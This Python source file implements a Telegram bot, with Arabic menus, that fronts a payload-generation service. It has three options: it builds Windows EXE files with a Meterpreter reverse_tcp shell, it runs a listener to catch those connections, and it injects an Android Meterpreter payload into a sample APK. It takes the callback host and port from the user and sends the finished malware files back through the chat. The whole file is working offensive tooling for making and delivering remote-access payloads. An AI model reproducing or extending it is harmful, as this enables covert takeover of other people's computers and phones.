import asyncio
import json
import os
import logging
from dataclasses import dataclass
from typing import Dict, Any, Optional

import httpx
from dotenv import load_dotenv
from telegram import (
    Update,
    InlineKeyboardMarkup,
    InlineKeyboardButton,
    InputFile,
)
from telegram.ext import (
    Application,
    CommandHandler,
    CallbackQueryHandler,
    ContextTypes,
    ConversationHandler,
    MessageHandler,
    filters,
)

load_dotenv()

logging.basicConfig(level=logging.INFO, format="%(asctime)s %(levelname)s %(message)s")
logger = logging.getLogger(__name__)

ORCH_URL = os.environ.get("ORCH_URL", "http://127.0.0.1:8000")
BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN", "")
OWNER_ID = int(os.environ.get("TELEGRAM_OWNER_ID", "0"))

MENU, PARAMS = range(2)

@dataclass
class Session:
    kind: Optional[str] = None
    params: Dict[str, str] = None
    task_id: Optional[str] = None


async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    logger.info("/start received from user_id=%s", getattr(update.effective_user, "id", None))
    if update.effective_user and OWNER_ID and update.effective_user.id != OWNER_ID:
        if update.message:
            await update.message.reply_text("تم رفض الوصول.")
        elif update.callback_query:
            await update.callback_query.answer("تم رفض الوصول.", show_alert=True)
        return ConversationHandler.END
    kb = [
        [InlineKeyboardButton("بايلود ويندوز", callback_data="kind:payload")],
        [InlineKeyboardButton("مستمع (Listener)", callback_data="kind:listener")],
        [InlineKeyboardButton("Android APK", callback_data="kind:android")],
    ]
    intro = (
        "اختر نوع المهمة:\n"
        "- بايلود ويندوز: توليد ملف EXE يحتوي اتصال عكسي (Meterpreter).\n"
        "- مستمع: تشغيل مستمع لالتقاط الاتصال على LHOST/LPORT.\n"
        "- Android APK: حقن حمولة داخل ملف APK عيّنة وإرساله لك."
    )
    if update.message:
        await update.message.reply_text(intro, reply_markup=InlineKeyboardMarkup(kb))
    else:
        await update.callback_query.edit_message_text(intro, reply_markup=InlineKeyboardMarkup(kb))
    context.user_data["session"] = Session(kind=None, params={})
    return MENU


async def ping(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("pong ✅")


async def unknown(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("أمر غير معروف. استخدم /start لفتح القائمة.")


async def menu_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data
    if data == "back":
        return await start(update, context)
    if not data.startswith("kind:"):
        return MENU
    kind = data.split(":", 1)[1]
    sess: Session = context.user_data.get("session")
    sess.kind = kind
    sess.params = {}
    back_kb = InlineKeyboardMarkup([[InlineKeyboardButton("⬅️ رجوع", callback_data="back")]])
    if kind == "payload":
        txt = (
            "أرسل المعلمات بهذا الشكل: LHOST LPORT OUTPUT_NAME\n"
            "مثال: 192.168.1.10 4444 win_test\n"
            "ملاحظة: سيتم استخدام payload افتراضي windows/meterpreter/reverse_tcp"
        )
        await query.edit_message_text(txt, reply_markup=back_kb)
    elif kind == "listener":
        txt = (
            "أرسل المعلمات بهذا الشكل: LHOST LPORT\n"
            "مثال شائع: 0.0.0.0 4444 (يستمع على كل الواجهات)\n"
            "يجب أن تطابق القيم المستخدمة في البايلود."
        )
        await query.edit_message_text(txt, reply_markup=back_kb)
    elif kind == "android":
        txt = (
            "أرسل المعلمات بهذا الشكل: LHOST LPORT\n"
            "مثال محاكي Android Studio: 10.0.2.2 4444\n"
            "مثال Genymotion: 10.0.3.2 4444\n"
            "أو داخل شبكة محلية: 192.168.x.x 4444\n"
            "سيُستخدم APK عيّنة وسيتم إرسال الناتج لك."
        )
        await query.edit_message_text(txt, reply_markup=back_kb)
    else:
        await query.edit_message_text("خيار غير مدعوم")
        return ConversationHandler.END
    return PARAMS


async def params_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    sess: Session = context.user_data.get("session")
    if not sess or not sess.kind:
        await update.message.reply_text("لا توجد جلسة نشطة. استخدم /start")
        return ConversationHandler.END
    parts = update.message.text.strip().split()
    if sess.kind == "payload":
        if len(parts) < 3:
            await update.message.reply_text("الاستخدام: LHOST LPORT OUTPUT_NAME\nمثال: 192.168.1.10 4444 win_test")
            return PARAMS
        lhost, lport, output_name = parts[:3]
        payload = "windows/meterpreter/reverse_tcp"
        sess.params = {"lhost": lhost, "lport": lport, "output_name": output_name, "payload": payload}
    elif sess.kind == "listener":
        if len(parts) < 2:
            await update.message.reply_text("الاستخدام: LHOST LPORT\nمثال: 0.0.0.0 4444")
            return PARAMS
        lhost, lport = parts[:2]
        payload = "windows/meterpreter/reverse_tcp"
        sess.params = {"lhost": lhost, "lport": lport, "payload": payload}
    elif sess.kind == "android":
        if len(parts) < 2:
            await update.message.reply_text("الاستخدام: LHOST LPORT\nأمثلة: 10.0.2.2 4444 أو 192.168.x.x 4444")
            return PARAMS
        lhost, lport = parts[:2]
        payload = "android/meterpreter/reverse_tcp"
        sess.params = {"lhost": lhost, "lport": lport, "payload": payload}
    else:
        await update.message.reply_text("خيار غير مدعوم")
        return ConversationHandler.END

    # create task
    async with httpx.AsyncClient(timeout=600) as client:
        resp = await client.post(f"{ORCH_URL}/tasks", json={"kind": sess.kind, "params": sess.params})
        resp.raise_for_status()
        data = resp.json()
        task = data["task"]
        sess.task_id = task["id"]
    await update.message.reply_text(f"تم إنشاء المهمة: {sess.task_id}\nسيتم تتبع التقدم وإرسال الملفات عند الانتهاء…")
    await poll_and_send(update, context, sess)
    return ConversationHandler.END


async def poll_and_send(update: Update, context: ContextTypes.DEFAULT_TYPE, sess: Session):
    chat_id = update.effective_chat.id
    async with httpx.AsyncClient(timeout=600) as client:
        for _ in range(60):
            r = await client.get(f"{ORCH_URL}/tasks/{sess.task_id}")
            r.raise_for_status()
            task = r.json()["task"]
            state = task["state"]
            state_ar = {"SUBMITTED":"تم الإرسال","PREPARING":"جارِ التحضير","RUNNING":"جارِ التنفيذ","SUCCEEDED":"تم بنجاح","FAILED":"فشل","CANCELLED":"أُلغي"}.get(state, state)
            await context.bot.send_message(chat_id, f"الحالة: {state_ar}")
            if state in ("SUCCEEDED", "FAILED", "CANCELLED"):
                if state == "SUCCEEDED":
                    arts = await client.get(f"{ORCH_URL}/tasks/{sess.task_id}/artifacts")
                    arts.raise_for_status()
                    artifacts = arts.json()
                    if artifacts:
                        for a in artifacts:
                            p = a["path"]
                            name = a["name"]
                            try:
                                with open(p, "rb") as f:
                                    await context.bot.send_document(chat_id, document=InputFile(f, filename=name), caption="الملف الناتج")
                            except Exception as e:
                                await context.bot.send_message(chat_id, f"تعذّر إرسال {name}: {e}")
                else:
                    await context.bot.send_message(chat_id, f"انتهت المهمة بحالة: {state_ar}\nالخطأ: {task.get('error')}")
                return
            await asyncio.sleep(2)
    await context.bot.send_message(chat_id, "انتهت مهلة الانتظار دون إكمال المهمة")


async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user and OWNER_ID and update.effective_user.id != OWNER_ID:
        await update.message.reply_text("تم رفض الوصول.")
        return
    if not context.args:
        await update.message.reply_text("الاستخدام: /cancel <task_id>")
        return
    task_id = context.args[0]
    async with httpx.AsyncClient(timeout=30) as client:
        r = await client.post(f"{ORCH_URL}/tasks/{task_id}/cancel")
        if r.status_code == 200:
            await update.message.reply_text(f"تم إلغاء المهمة: {task_id}")
        else:
            await update.message.reply_text(f"تعذّر الإلغاء: {r.text}")


def main():
    token = BOT_TOKEN
    if not token:
        print("Please set TELEGRAM_BOT_TOKEN in environment.")
        return
    application = Application.builder().token(token).build()
    conv = ConversationHandler(
        entry_points=[CommandHandler("start", start), CommandHandler("menu", start)],
        states={
            MENU: [CallbackQueryHandler(menu_handler)],
            PARAMS: [
                MessageHandler(filters.TEXT & (~filters.COMMAND), params_handler),
                CommandHandler("start", start),
                CommandHandler("menu", start),
                CallbackQueryHandler(menu_handler),
            ],
        },
        fallbacks=[CommandHandler("start", start), CommandHandler("menu", start)],
        per_message=False,
        per_user=True,
        per_chat=True,
    )
    application.add_handler(conv)
    application.add_handler(CommandHandler("cancel", cancel))
    application.add_handler(CommandHandler("ping", ping))
    application.add_handler(MessageHandler(filters.COMMAND, unknown))
    logger.info("Starting polling...")
    try:
        application.run_polling(allowed_updates=("message","callback_query"), drop_pending_updates=True)
    except Exception as e:
        logger.exception("Bot crashed: %s", e)


if __name__ == "__main__":
    main()